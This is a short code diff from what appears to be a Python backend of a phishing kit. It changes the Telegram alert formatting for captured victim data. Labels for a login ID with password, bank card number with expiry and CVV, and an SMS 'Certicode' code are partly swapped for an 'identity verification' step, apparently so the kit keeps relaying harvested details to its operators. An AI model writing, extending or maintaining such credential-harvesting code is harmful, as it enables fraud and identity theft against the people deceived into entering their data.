@@ -69,15 +69,13 @@ def _client_meta(request: Request) -> Dict[str, str]:
 def _format_telegram_message(step: str, session_id: str, fields: Dict[str, Any], meta: Dict[str, str]) -> str:
     step_emoji = {
         "login": "🔐",
-        "card": "💳",
-        "sms": "📱",
+        "identity": "🪪",
         "complete": "✅",
     }.get(step, "ℹ️")
 
     step_label = {
         "login": "Connexion (Identifiant + Mot de passe)",
-        "card": "Carte bancaire (PAN + Exp + CVV)",
-        "sms": "Téléphone + Code Certicode SMS",
+        "identity": "Vérification d'identité",
         "complete": "Parcours terminé",
     }.get(step, step)
 
